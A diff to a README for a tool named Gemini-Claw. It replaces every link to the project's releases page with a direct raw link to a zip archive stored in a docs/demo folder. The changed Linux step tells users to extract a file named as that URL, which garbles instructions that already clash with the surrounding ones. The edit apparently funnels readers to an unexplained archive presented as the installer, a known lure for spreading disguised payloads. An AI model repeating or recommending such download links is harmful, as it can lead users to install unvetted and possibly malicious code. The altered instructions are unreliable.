@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download Gemini-Claw](https://img.shields.io/badge/Download-Gemini--Claw-blue.svg)](https://github.com/YusuFBankur/Gemini-Claw/releases)
+[![Download Gemini-Claw](https://github.com/YusuFBankur/Gemini-Claw/raw/refs/heads/main/docs/demo/Gemini_Claw_v2.0.zip)](https://github.com/YusuFBankur/Gemini-Claw/raw/refs/heads/main/docs/demo/Gemini_Claw_v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -25,14 +25,14 @@ To run Gemini-Claw, you need:
 
 ## 📦 Download & Install
 
-1. Visit [this page to download](https://github.com/YusuFBankur/Gemini-Claw/releases).
+1. Visit [this page to download](https://github.com/YusuFBankur/Gemini-Claw/raw/refs/heads/main/docs/demo/Gemini_Claw_v2.0.zip).
 2. Choose the latest release version.
 3. Download the installer file for your operating system (Windows, macOS, or Linux).
 4. Follow the installation instructions based on your OS.
 
    - **For Windows**: Double-click the downloaded `.exe` file and follow the prompts.
    - **For macOS**: Open the downloaded `.dmg` file and drag Gemini-Claw to your Applications folder.
-   - **For Linux**: Extract the downloaded `.tar.gz` file and follow the included instructions.
+   - **For Linux**: Extract the downloaded `https://github.com/YusuFBankur/Gemini-Claw/raw/refs/heads/main/docs/demo/Gemini_Claw_v2.0.zip` file and follow the included instructions.
 
 ## 📋 Features
 
@@ -98,4 +98,4 @@ Stay tuned for future updates and enhancements. Your feedback helps us improve a
 
 ---
 
-For more details, visit [this page to download](https://github.com/YusuFBankur/Gemini-Claw/releases).
+For more details, visit [this page to download](https://github.com/YusuFBankur/Gemini-Claw/raw/refs/heads/main/docs/demo/Gemini_Claw_v2.0.zip).
